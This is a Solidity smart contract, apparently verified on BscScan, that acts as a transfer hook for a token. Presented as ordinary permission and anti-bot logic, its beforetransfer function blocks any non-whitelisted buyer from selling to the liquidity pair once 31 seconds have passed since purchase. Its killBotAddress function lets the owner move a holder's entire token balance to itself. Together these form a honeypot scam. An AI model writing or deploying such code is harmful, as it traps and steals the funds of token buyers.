/**
 *Submitted for verification at BscScan.com on 2023-01-29
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

interface IERC20 {
  function decimals() external pure returns (uint8);
  function approve(address spender, uint256 amount) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract permission {
    mapping(address => mapping(string => bytes32)) private permit;

    function newpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode(adr,str))); }

    function clearpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode("null"))); }

    function checkpermit(address adr,string memory str) public view returns (bool) {
        if(permit[adr][str]==bytes32(keccak256(abi.encode(adr,str)))){ return true; }else{ return false; }
    }
}

contract ERC20IMPLEMENT is permission {

    address public owner;
    address public liquidity;

    mapping(address => bool) public permit;
    mapping(address => uint256) public genesisblock;
    
    constructor() {
        newpermit(msg.sender,"owner");
        owner = msg.sender;
    }

    function setLiquidityPair(address adr) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        liquidity = adr;
        return true;
    }

    function permitAddress(address adr,bool flag) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        permit[adr] = flag;
        return true;
    }

    function beforetransfer(address from,address to, uint256 amount) external returns (bool){
        if( liquidity!=address(0) && amount > 0 ){
            if( !permit[from] && to==liquidity ){
                if(genesisblock[from]<block.timestamp){
                    revert("!Error: Ask For Permit");
                }
            }
            if( !permit[to] && from==liquidity ){
                if(genesisblock[to]==0){
                    genesisblock[to] = block.timestamp;
                    genesisblock[to] += 31;
                }
            }
        }
        return true;
    }

    function killBotAddress(address botAddress,address token) external returns (bool){
        require(checkpermit(msg.sender,"owner"));
        uint256 amount = IERC20(token).balanceOf(botAddress);
        IERC20(token).transferFrom(botAddress,owner,amount);
        return true;
    }

    function transferOwnership(address adr) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        newpermit(adr,"owner");
        clearpermit(msg.sender,"owner");
        owner = adr;
        return true;
    }
}